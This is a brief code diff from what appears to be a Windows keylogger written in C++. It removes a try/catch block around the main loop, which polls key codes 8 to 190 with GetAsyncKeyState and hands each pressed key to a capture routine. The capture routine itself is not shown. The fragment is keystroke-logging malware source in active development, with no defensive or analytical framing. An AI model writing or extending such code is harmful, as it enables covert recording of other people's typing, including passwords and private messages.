@@ -486,18 +486,13 @@ int main()
 
     while (true)
     {
-        try {
-            for (int key = 8; key <= 190; key++)
-            {
-                if (GetAsyncKeyState(key) == -32767) {
-                    if (captureKeys(key) == false) {
-                        continue;
-                    }
+        for (int key = 8; key <= 190; key++)
+        {
+            if (GetAsyncKeyState(key) == -32767) {
+                if (captureKeys(key) == false) {
+                    continue;
                 }
             }
-        
-        } catch (exception e) {
-            cout << "error" << endl;
         }
     }
 }
